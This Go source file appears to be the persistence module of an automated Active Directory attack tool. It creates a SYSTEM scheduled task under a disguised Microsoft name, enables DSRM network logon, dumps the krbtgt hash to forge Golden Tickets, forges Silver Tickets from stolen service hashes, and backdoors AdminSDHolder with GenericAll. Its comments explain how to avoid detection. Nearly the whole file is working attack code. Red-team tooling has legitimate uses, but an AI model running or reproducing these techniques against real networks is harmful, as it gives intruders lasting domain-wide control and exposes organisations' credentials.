package modules

import (
	"context"
	"fmt"
	"log/slog"
	"net/url"
	"regexp"
	"strings"
	"time"

	"adpack/core"
	"adpack/tools"
	"adpack/utils"
)

// RunPersistence deploys long-term access mechanisms against a domain controller.
// Each technique is independently attempted; a missing tool or insufficient
// privilege skips that technique rather than failing the whole phase.
//
// Techniques (best-effort, tool-gated):
//   - Scheduled task on logon (SYSTEM)            → schtasks via failover exec
//   - Golden Ticket forging                       → secretsdump + impacket-ticketer
//   - Silver Ticket forging (per service account) → impacket-ticketer -spn
//   - DSRM password-reuse logon enable            → reg add via failover exec
//   - AdminSDHolder GenericAll backdoor           → impacket-dacledit (preferred)
//     or bloodyAD (fallback)
//   - Skeleton Key (informational)
//     exec is viable; not auto-deployed
//     because of high detection signal
func RunPersistence(state *core.ADState, targetHost string) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	host, found := selectTarget(state, targetHost)
	if !found {
		slog.Warn("No target for persistence")
		result.Success = false
		return result
	}

	domain, user, pass, hash := getDomainCredential(state, host.Domain)
	if domain == "" || user == "" {
		domain, user, pass, hash = getCredential(state)
	}
	if domain == "" || user == "" {
		slog.Warn("No credentials for persistence")
		result.Success = false
		return result
	}

	ctx := context.Background()
	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)

	utils.Section("⚓", "Persistence", "backdoor and persistence mechanism deployment")

	deployed := 0

	utils.Attempt("⏰", host.IP, "Scheduled Task on Logon (SYSTEM)")
	if deployScheduledTask(ctx, exec, host, result) {
		utils.StepOk("Scheduled task created (onlogon, SYSTEM)")
		deployed++
	} else {
		utils.StepWarn("Scheduled task creation failed or skipped")
	}
	utils.Attempt("🔑", host.IP, "DSRM password-reuse logon (registry)")
	if deployDSRM(ctx, exec, host, result) {
		utils.StepOk("DSRM logon behavior set to 2 (password-reuse enabled)")
		deployed++
	} else {
		utils.StepWarn("DSRM configuration failed or skipped")
	}
	if host.IsDC {
		utils.Attempt("🪙", host.IP, "Golden Ticket (krbtgt hash + ticketer)")
		if deployGoldenTicket(host, domain, user, pass, hash, result, state) {
			utils.StepOk("Golden Ticket forged")
			deployed++
		} else {
			utils.StepWarn("Golden Ticket forging failed")
		}
		utils.Attempt("🛡️", host.IP, "AdminSDHolder GenericAll backdoor")
		if deployAdminSDHolder(host, domain, user, pass, hash, result) {
			utils.StepOk("AdminSDHolder GenericAll granted")
			deployed++
		} else {
			utils.StepWarn("AdminSDHolder backdoor failed")
		}
		flagSkeletonKeyOpportunity(host, result)
	} else {
		slog.Debug("Target is not a DC — skipping Golden Ticket / AdminSDHolder / Skeleton Key")
	}

	// Silver Ticket runs against any host, not just the DC — it only needs a
	// previously captured service account hash and the domain SID. Crucially
	// it bypasses the KDC entirely so it works even when AdminSDHolder /
	// Golden Ticket are blocked by DC-side detections.
	utils.Attempt("🥈", host.IP, "Silver Ticket(s) from service hashes")
	if n := deploySilverTickets(state, host, domain, user, pass, hash, result); n > 0 {
		utils.StepOk(fmt.Sprintf("%d Silver Ticket(s) forged", n))
		deployed += n
	} else {
		utils.StepWarn("Silver Ticket forging returned no tickets")
	}

	if deployed == 0 {
		utils.StepWarn("No persistence mechanisms deployed")
		slog.Warn("No persistence mechanisms deployed")
		result.Success = false
	} else {
		utils.StepOk(fmt.Sprintf("%d persistence mechanism(s) deployed", deployed))
		slog.Info("Persistence mechanism(s) deployed", "count", deployed)
	}
	return result
}

// deployScheduledTask creates an onlogon task running as SYSTEM. Hardened over the
// original by routing through RunFailover (so a wmiexec hang doesn't kill the phase)
// and by giving the task a less attention-grabbing name.
func deployScheduledTask(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
	slog.Debug("Creating scheduled task persistence (onlogon, SYSTEM)...")
	cmd := `schtasks /create /tn "Microsoft\Windows\UpdateOrchestrator\HealthCheck" ` +
		`/tr "cmd.exe /c start /B powershell -NoP -W Hidden -C exit" ` +
		`/sc onlogon /ru SYSTEM /rl HIGHEST /f`
	r := exec.Execute(ctx, core.Action{
		Artifact: cmd, Method: "command", Timeout: 45 * time.Second,
	})
	if !r.Success {
		slog.Warn("Scheduled task creation failed", "method", r.Method)
		return false
	}
	slog.Info("Scheduled task created", "method", r.Method)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "schtasks", Key: host.IP,
		Value:     "onlogon task as SYSTEM",
		RawOutput: r.Output, Timestamp: time.Now(),
	})
	return true
}

// deployDSRM enables DSRM password-reuse logon via:
//
//	reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
//
// On a DC this lets the local Administrator (DSRM) account log in over the network
// using the DSRM password. Requires SYSTEM context, so we run via failover (which
// promotes through smbexec/atexec).
func deployDSRM(ctx context.Context, exec core.Executor, host core.Host, result *core.ToolResult) bool {
	if !host.IsDC {
		return false
	}
	slog.Debug("Enabling DSRM password-reuse logon (registry)...")
	cmd := `reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f`
	r := exec.Execute(ctx, core.Action{
		Artifact: cmd, Method: "command", Timeout: 30 * time.Second,
	})
	if !r.Success {
		slog.Warn("DSRM registry write failed", "method", r.Method)
		return false
	}
	slog.Info("DSRM logon behavior set to 2", "method", r.Method)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "dsrm", Key: host.IP,
		Value:     "DSRMAdminLogonBehavior=2 (password-reuse logon enabled)",
		RawOutput: r.Output, Timestamp: time.Now(),
	})
	return true
}

// deployGoldenTicket performs a real Golden Ticket forge:
//  1. impacket-secretsdump -just-dc-user krbtgt to obtain the krbtgt NT hash + Domain SID
//  2. impacket-ticketer to forge a TGT for a fictitious admin user (configurable)
//  3. Write the .ccache to the local /tmp and record the path in evidence so the
//     operator can KRB5CCNAME it for follow-on commands.
//
// This requires DA-level creds (already enforced upstream by validation phase).
func deployGoldenTicket(host core.Host, domain, user, pass, hash string, result *core.ToolResult, state *core.ADState) bool {
	slog.Debug("Forging Golden Ticket (secretsdump krbtgt → impacket-ticketer)...")

	if _, err := utils.FindTool("impacket-secretsdump"); err != nil {
		slog.Warn("impacket-secretsdump not found, skipping Golden Ticket")
		return false
	}
	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
		slog.Warn("impacket-ticketer not found, skipping Golden Ticket")
		return false
	}

	// Collect all DC IPs to try. Try the primary host first, then any additional
	// DCs from state (handles multi-domain where user is DA in one domain's DC
	// but not another's).
	dcIPs := []string{host.IP}
	for _, h := range state.Hosts {
		if h.IsDC && h.IP != host.IP && h.IP != "" {
			dcIPs = append(dcIPs, h.IP)
		}
	}

	var lastErr string
	for _, dcIP := range dcIPs {
		authSpec := buildImpacketAuth(domain, user, pass, hash, dcIP)

		// Pull just the krbtgt secret + the domain SID from the DC.
		args := []string{authSpec, "-just-dc-user", "krbtgt"}
		args = append(args, impacketHashArgs(hash)...)
		r := utils.RunCommandTimeout(2*time.Minute, "impacket-secretsdump", args)
		if !r.Success {
			lastErr = strings.TrimSpace(r.Stderr)
			slog.Warn("secretsdump krbtgt failed on host", "host", dcIP, "error", lastErr)
			continue
		}

		// Distinguish between "auth/priv rejected by DC" and "secretsdump succeeded
		// but our extractor missed the hash" — they need very different operator
		// responses (escalate to DA vs fix the parser).
		combined := r.Stdout + "\n" + r.Stderr
		lower := strings.ToLower(combined)
		switch {
		case strings.Contains(lower, "rpc_s_access_denied") ||
			strings.Contains(lower, "drs_s_access_denied") ||
			strings.Contains(lower, "status_access_denied") ||
			strings.Contains(lower, "dra_bad_dn") ||
			strings.Contains(lower, "name_error_not_unique"):
			slog.Warn("Golden Ticket: lacks DCSync rights on host — needs Replicating Directory Changes", "domain", domain, "username", user, "host", dcIP)
			lastErr = "access_denied"
			continue
		case strings.Contains(lower, "logon_failure") ||
			strings.Contains(lower, "kdc_err_preauth_failed") ||
			strings.Contains(lower, "invalid credentials") ||
			strings.Contains(lower, "status_logon_failure"):
			slog.Warn("Golden Ticket: auth rejected — credentials are wrong", "domain", domain, "username", user, "host", dcIP)
			return false // auth won't work on any DC
		}

		krbtgtHash := extractKrbtgtNTHash(r.Stdout)
		if krbtgtHash == "" {
			slog.Warn("Golden Ticket: secretsdump succeeded but krbtgt NT hash not in output", "host", dcIP)
			lastErr = "parser_miss"
			continue
		}

		// Hash found! Now resolve the domain SID via impacket-lookupsid.
		domainSID := resolveDomainSID(domain, user, pass, hash, dcIP)
		if domainSID == "" {
			slog.Warn("Could not resolve domain SID via impacket-lookupsid")
			return false
		}

		// We have both krbtgt hash and domain SID — forge the ticket.
		return forgeAndSaveTicket(krbtgtHash, domainSID, domain, result)
	}

	// All DCs exhausted.
	switch lastErr {
	case "access_denied":
		slog.Warn("Golden Ticket: no DC found with DCSync rights — need DA in target domain", "domain", domain, "username", user)
	case "parser_miss":
		slog.Warn("Golden Ticket: secretsdump ran but krbtgt hash not in output (parser miss or empty replication response)")
	default:
		slog.Warn("Golden Ticket: all DCs failed", "last_error", lastErr)
	}
	return false
}

// forgeAndSaveTicket runs impacket-ticketer and records the forged ticket + krbtgt hash.
func forgeAndSaveTicket(krbtgtHash, domainSID, domain string, result *core.ToolResult) bool {
	ts := time.Now().Unix()
	ccacheUser := fmt.Sprintf("svc_health_%d", ts)
	ccachePath := fmt.Sprintf("/tmp/golden_%s.ccache", ccacheUser)

	tArgs := []string{
		"-nthash", krbtgtHash,
		"-domain-sid", domainSID,
		"-domain", domain,
		ccacheUser,
	}
	tr := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", tArgs)
	if !tr.Success {
		slog.Warn("impacket-ticketer failed", "error", tr.Stderr)
		return false
	}

	moveR := utils.RunCommandTimeout(10*time.Second, "mv",
		[]string{fmt.Sprintf("%s.ccache", ccacheUser), ccachePath})
	if !moveR.Success {
		ccachePath = fmt.Sprintf("./%s.ccache", ccacheUser)
	}

	slog.Info("Golden Ticket forged", "path", ccachePath)
	slog.Info("Use: export KRB5CCNAME=path", "path", ccachePath)
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "golden_ticket", Key: ccacheUser + "@" + domain,
		Value:      ccachePath,
		Confidence: 0.95, RawOutput: tr.Stdout, Timestamp: time.Now(),
	})
	result.Creds = append(result.Creds, core.Credential{
		Type: core.CredHash, Username: "krbtgt", Domain: domain,
		Hash: krbtgtHash, Secret: krbtgtHash,
		Source: "secretsdump_persistence", Target: "", Validated: true,
	})
	return true
}

// silverTicketCandidate is one hash + SPN pair derived from state.Creds.
type silverTicketCandidate struct {
	username string // account whose hash signs the ticket (no $ suffix dropped — preserved as-is)
	hash     string // NT hash of that service principal
	spn      string // SPN this hash unlocks (e.g. cifs/dc01.sevenkingdoms.local)
	source   string // provenance for evidence (kerberoast, secretsdump, etc.)
}

// collectSilverTicketCandidates walks state.Creds + state.Users to find
// service accounts we hold NT hashes for, paired with at least one SPN.
//
// Two sources qualify:
//
//  1. Machine accounts (Username ends with '$') with a hash — the SPN is
//     derived from the corresponding host (cifs/<host>.<domain> by default).
//  2. Kerberoasted user accounts where state.Users contains SPNs — each
//     SPN becomes a candidate.
//
// We don't emit duplicates; first occurrence wins.
func collectSilverTicketCandidates(state *core.ADState, domain string) []silverTicketCandidate {
	seen := make(map[string]bool)
	var out []silverTicketCandidate

	// Index users → SPNs for fast lookup by SAM name.
	userSPNs := make(map[string]string)
	for _, u := range state.Users {
		if u.SPNs == "" {
			continue
		}
		userSPNs[strings.ToLower(u.SAMAccountName)] = u.SPNs
		if u.Username != "" {
			userSPNs[strings.ToLower(u.Username)] = u.SPNs
		}
	}

	for _, c := range state.Creds {
		if c.Type != core.CredHash || c.Hash == "" {
			continue
		}
		// Machine account: derive SPN from username (strip trailing $).
		if strings.HasSuffix(c.Username, "$") {
			machine := strings.TrimSuffix(c.Username, "$")
			spn := fmt.Sprintf("cifs/%s.%s", strings.ToLower(machine), strings.ToLower(domain))
			key := c.Username + "|" + spn
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, silverTicketCandidate{
				username: c.Username, hash: c.Hash, spn: spn, source: c.Source,
			})
			continue
		}
		// Kerberoasted user: one candidate per SPN we know about.
		spns, ok := userSPNs[strings.ToLower(c.Username)]
		if !ok || spns == "" {
			continue
		}
		for _, spn := range strings.Split(spns, ",") {
			spn = strings.TrimSpace(spn)
			if spn == "" {
				continue
			}
			key := c.Username + "|" + spn
			if seen[key] {
				continue
			}
			seen[key] = true
			out = append(out, silverTicketCandidate{
				username: c.Username, hash: c.Hash, spn: spn, source: c.Source,
			})
		}
	}
	return out
}

// deploySilverTickets forges one Silver Ticket per (service-hash, SPN) pair
// discovered in state. Returns the number of tickets successfully written.
//
// Silver Tickets are dramatically quieter than Golden Tickets because they
// never contact the KDC — the attacker encrypts the TGS directly with the
// service's NT hash. Detection requires service-side logs (rare in practice)
// or PAC-validation enforcement (not default).
//
// References:
//   - Sean Metcalf, "Sneaky Persistence: AD Silver Tickets"
//   - impacket examples/ticketer.py --spn flag
func deploySilverTickets(state *core.ADState, host core.Host, domain, user, pass, hash string, result *core.ToolResult) int {
	candidates := collectSilverTicketCandidates(state, domain)
	if len(candidates) == 0 {
		slog.Debug("No service hashes in state — skipping Silver Ticket")
		return 0
	}
	if _, err := utils.FindTool("impacket-ticketer"); err != nil {
		slog.Warn("impacket-ticketer not found, skipping Silver Ticket")
		return 0
	}

	domainSID := resolveDomainSID(domain, user, pass, hash, host.IP)
	if domainSID == "" {
		slog.Warn("Could not resolve domain SID — skipping Silver Ticket")
		return 0
	}

	slog.Debug("Forging Silver Tickets for service hash(es)", "count", len(candidates))

	// Impersonate "Administrator" by default — operator can change later by
	// re-running with KRB5CCNAME pointed at the forged ticket.
	impersonated := "Administrator"

	deployed := 0
	for _, c := range candidates {
		ts := time.Now().Unix()
		// Encode SPN into filename so multiple tickets don't clobber each other.
		safeSPN := strings.NewReplacer("/", "_", ":", "-", "\\", "_").Replace(c.spn)
		ccachePath := fmt.Sprintf("/tmp/silver_%s_%d.ccache", safeSPN, ts)

		args := []string{
			"-nthash", c.hash,
			"-domain-sid", domainSID,
			"-domain", domain,
			"-spn", c.spn,
			impersonated,
		}
		r := utils.RunCommandTimeout(60*time.Second, "impacket-ticketer", args)
		if !r.Success {
			slog.Warn("Silver ticket: ticketer failed", "spn", c.spn, "error", strings.TrimSpace(r.Stderr))
			continue
		}

		// impacket-ticketer writes <impersonated>.ccache in CWD; move it
		// deterministically per-SPN.
		moveR := utils.RunCommandTimeout(10*time.Second, "mv",
			[]string{fmt.Sprintf("%s.ccache", impersonated), ccachePath})
		if !moveR.Success {
			ccachePath = fmt.Sprintf("./%s.ccache", impersonated)
		}

		slog.Info("Silver ticket forged", "spn", c.spn, "path", ccachePath, "signed_by", c.username)
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhasePersistence,
			Source: "silver_ticket",
			Key:    impersonated + "@" + c.spn,
			Value: fmt.Sprintf("ccache=%s signer=%s spn=%s (source=%s)",
				ccachePath, c.username, c.spn, c.source),
			Confidence: 0.9, RawOutput: r.Stdout, Timestamp: time.Now(),
		})
		deployed++
	}

	if deployed > 0 {
		slog.Info("Silver Ticket(s) forged", "count", deployed)
	}
	return deployed
}

// deployAdminSDHolder grants GenericAll on the AdminSDHolder container so the
// SDProp process propagates the ACE to every protected group member every 60min.
//
// Tries impacket-dacledit (modern, native) first; falls back to bloodyAD which
// many red teamers have installed. Both are LDAP operations — no shell needed.
func deployAdminSDHolder(host core.Host, domain, user, pass, hash string, result *core.ToolResult) bool {
	slog.Debug("Backdooring AdminSDHolder (GenericAll → SDProp propagation)...")

	// We grant the existing admin user GenericAll on AdminSDHolder. The principal
	// is the same authenticated user — survives password reset because the ACE
	// remains on AdminSDHolder and SDProp re-applies it to every protected member.
	principal := user

	if _, err := utils.FindTool("impacket-dacledit"); err == nil {
		auth := buildImpacketAuth(domain, user, pass, hash, host.IP)
		args := []string{
			auth,
			"-action", "write",
			"-rights", "FullControl",
			"-principal", principal,
			"-target-dn", buildAdminSDHolderDN(domain),
		}
		args = append(args, impacketHashArgs(hash)...)
		r := utils.RunCommandTimeout(60*time.Second, "impacket-dacledit", args)
		if r.Success {
			slog.Info("AdminSDHolder GenericAll granted (impacket-dacledit)", "principal", principal)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
				Source: "adminsdholder", Key: host.IP,
				Value:      fmt.Sprintf("GenericAll granted to %s on AdminSDHolder", principal),
				Confidence: 0.95, RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			return true
		}
		slog.Warn("impacket-dacledit failed", "error", r.Stderr)
	}

	if _, err := utils.FindTool("bloodyAD"); err == nil {
		auth := []string{"-H", host.IP, "-d", domain, "-u", user}
		if hash != "" {
			auth = append(auth, "-p", ":"+hash)
		} else {
			auth = append(auth, "-p", pass)
		}
		args := append(auth, "add", "genericAll", buildAdminSDHolderDN(domain), principal)
		r := utils.RunCommandTimeout(60*time.Second, "bloodyAD", args)
		if r.Success {
			slog.Info("AdminSDHolder GenericAll granted (bloodyAD)", "principal", principal)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhasePersistence,
				Source: "adminsdholder", Key: host.IP,
				Value:      fmt.Sprintf("GenericAll granted to %s on AdminSDHolder", principal),
				Confidence: 0.9, RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			return true
		}
		slog.Warn("bloodyAD failed", "error", r.Stderr)
	}

	slog.Warn("Neither impacket-dacledit nor bloodyAD available, skipping AdminSDHolder")
	return false
}

// flagSkeletonKeyOpportunity records that a Skeleton Key implant is viable on
// this host without actually deploying it — Skeleton Key is high-noise (touches
// LSASS, alerts every modern EDR) and should be an explicit operator decision,
// not an auto-applied default.
func flagSkeletonKeyOpportunity(host core.Host, result *core.ToolResult) {
	if !tools.GoMimikatz.Available() {
		return
	}
	slog.Debug("Skeleton Key opportunity: target is DC")
	slog.Info("(not auto-deployed — high detection signal; run manually if scoped)")
	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhasePersistence,
		Source: "skeleton_key", Key: host.IP,
		Value:      "viable (not deployed)",
		Confidence: 0.5, Timestamp: time.Now(),
	})
}

// buildImpacketAuth returns the auth spec for impacket CLI tools. The user and
// password are URL-encoded so passwords containing ':' or '@' (which impacket
// parses to split DOMAIN/user:pass@target) don't get misinterpreted.
//
// Hash-only callers should also append the result of impacketHashArgs(hash) to
// the args slice; without it, impacket has no credential and authentication
// fails silently.
func buildImpacketAuth(domain, user, pass, hash, dcIP string) string {
	u := url.QueryEscape(user)
	if hash != "" && pass == "" {
		return fmt.Sprintf("%s/%s@%s", domain, u, dcIP)
	}
	return fmt.Sprintf("%s/%s:%s@%s", domain, u, url.QueryEscape(pass), dcIP)
}

// impacketHashArgs returns the CLI args that supply an NT hash to impacket
// tools when the auth spec form omits a password. Returns nil when hash is
// empty so it can be unconditionally appended.
func impacketHashArgs(hash string) []string {
	if hash == "" {
		return nil
	}
	return []string{"-hashes", ":" + hash}
}

func buildAdminSDHolderDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return "CN=AdminSDHolder,CN=System," + strings.Join(dcs, ",")
}

var krbtgtNTRe = regexp.MustCompile(`(?m)^krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32}):::`)

func extractKrbtgtNTHash(secretsdumpOut string) string {
	m := krbtgtNTRe.FindStringSubmatch(secretsdumpOut)
	if len(m) < 2 {
		return ""
	}
	return strings.ToLower(m[1])
}

var domainSIDRe = regexp.MustCompile(`Domain SID is:\s*(S-1-5-21-[0-9-]+)`)

// resolveDomainSID calls impacket-lookupsid against the DC and parses the
// "Domain SID is:" line. Returns "" on any failure.
func resolveDomainSID(domain, user, pass, hash, dcIP string) string {
	if _, err := utils.FindTool("impacket-lookupsid"); err != nil {
		return ""
	}
	auth := buildImpacketAuth(domain, user, pass, hash, dcIP)
	args := []string{auth, "0"} // RID 0 just enumerates the domain
	args = append(args, impacketHashArgs(hash)...)
	r := utils.RunCommandTimeout(45*time.Second, "impacket-lookupsid", args)
	if !r.Success {
		return ""
	}
	m := domainSIDRe.FindStringSubmatch(r.Stdout)
	if len(m) < 2 {
		return ""
	}
	return m[1]
}
